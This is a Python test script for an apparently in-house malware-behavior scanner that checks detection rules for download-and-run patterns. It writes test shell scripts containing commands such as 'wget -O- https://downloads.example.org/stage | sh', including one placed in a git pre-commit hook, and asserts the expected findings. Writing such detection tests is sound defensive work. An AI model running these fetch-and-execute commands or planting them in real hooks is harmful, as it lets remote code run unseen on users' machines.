#!/usr/bin/env python3
"""Check shared-rule coverage outside test-directory suppression contexts."""
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile

ROOT = Path(__file__).resolve().parents[3]
DEPLOY = 'micro-behaviors/process/deploy/interpreter-stdin::'
VARIABLE = 'micro-behaviors/communications/http/download/shell::wget-var-reference'
RAW_PIPE = 'micro-behaviors/process/create/shell/pipeline::http-client-pipe-shell-raw-text'


def decode_many(text):
    decoder = json.JSONDecoder()
    while text.strip():
        text = text.lstrip()
        doc, end = decoder.raw_decode(text)
        yield doc
        text = text[end:]


def main():
    binary = sys.argv[1] if len(sys.argv) > 1 else 'cleave'
    with tempfile.TemporaryDirectory(prefix='stranded-behavior-') as temp:
        folder = Path(temp)
        fixtures = [
            'taxonomy/wget-pipe-eval-semantics/wget-piped-to-sh.sh',
            'taxonomy/wget-pipe-eval-semantics/wget-piped-to-eval.sh',
            'taxonomy/official-installer-pipe-boundary/evil-fetch.sh',
            'taxonomy/official-installer-pipe-boundary/docker-bootstrap.sh',
            'taxonomy/wget-pipe-sh-installer-carveout/unknown-payload-dropper.sh',
            'taxonomy/wget-pipe-sh-installer-carveout/installer-bootstrap.sh',
            'taxonomy/wget-pipe-sh-installer-carveout/gosec-bootstrap.sh',
            'hostile/hidden-cron-init-loader.sh',
            'hostile/wildcard-multiarch-dropper.sh',
        ]
        for source in fixtures:
            shutil.copyfile(ROOT / 'testdata' / source, folder / Path(source).name)
        scenarios = {
            'variable-input.sh': '#!/bin/sh\nwget "$SOURCE" -O "$DEST"\n',
            'variable-after-pipe.sh': '#!/bin/sh\nwget -O - https://downloads.example.org/bootstrap | sh -s "$VERSION"\n',
            'variable-after-semicolon.sh': '#!/bin/sh\nwget -O data https://downloads.example.org/data; echo "$VERSION"\n',
            'variable-after-background.sh': '#!/bin/sh\nwget -O data https://downloads.example.org/data & echo "$VERSION"\n',
            'pre-commit': '#!/bin/sh\nwget -O- https://downloads.example.org/stage | sh\n',
            'five-shells.sh': '#!/bin/sh\n' + ''.join(
                'wget -O- https://downloads.example.org/stage | ' + shell + '\n'
                for shell in ['sh', 'zsh', 'ksh', 'dash', 'shell']
            ),
        }
        for name, text in scenarios.items():
            (folder / name).write_text(text)
        result = subprocess.run(
            [binary, '--traits-dir', str(ROOT), '--format', 'json', str(folder)],
            env={**os.environ, 'CLEAVE_VALIDATE': '0'},
            text=True, capture_output=True, check=True,
        )
        files = {
            Path(f['path']).name: {t['id']: t for t in f.get('traits', [])}
            for doc in decode_many(result.stdout) for f in doc['files']
        }
        for name in ['wget-piped-to-sh.sh', 'evil-fetch.sh', 'unknown-payload-dropper.sh', 'variable-after-pipe.sh', 'pre-commit']:
            assert files[name][DEPLOY + 'wget-pipe-sh']['crit'] == 3, name
            assert RAW_PIPE in files[name], name
        for name in ['wget-piped-to-eval.sh', 'installer-bootstrap.sh', 'gosec-bootstrap.sh', 'docker-bootstrap.sh']:
            assert DEPLOY + 'wget-pipe-sh' not in files[name], name
        for name in ['variable-after-pipe.sh', 'variable-after-semicolon.sh', 'variable-after-background.sh']:
            assert VARIABLE not in files[name], name
        for name in ['variable-input.sh', 'hidden-cron-init-loader.sh']:
            assert VARIABLE in files[name], name
        for suffix in ['sh', 'zsh', 'ksh', 'dash', 'shell-word']:
            assert files['five-shells.sh'][DEPLOY + 'wget-pipe-' + suffix]['crit'] == 3
        assert files['pre-commit']['objectives/supply-chain/install-hook/dropper/git-hook::git-hook-download-pipe-shell']['crit'] == 5
        assert files['hidden-cron-init-loader.sh']['objectives/persistence/system/init/boot::shell-multi-surface-boot-persistence']['crit'] == 5
        assert files['wildcard-multiarch-dropper.sh']['objectives/command-and-control/dropper/delivery/fetch-exec::raw-ip-multiarch-wildcard-chmod-dropper']['crit'] == 5
        retired = 'objectives/command-and-control/dropper/delivery/pipe::wget-pipe-'
        assert not any(t.startswith(retired) for traits in files.values() for t in traits)
        print(f'{len(files)} fixtures passed; fetch, execution and contextual attacks retained')


if __name__ == '__main__':
    main()
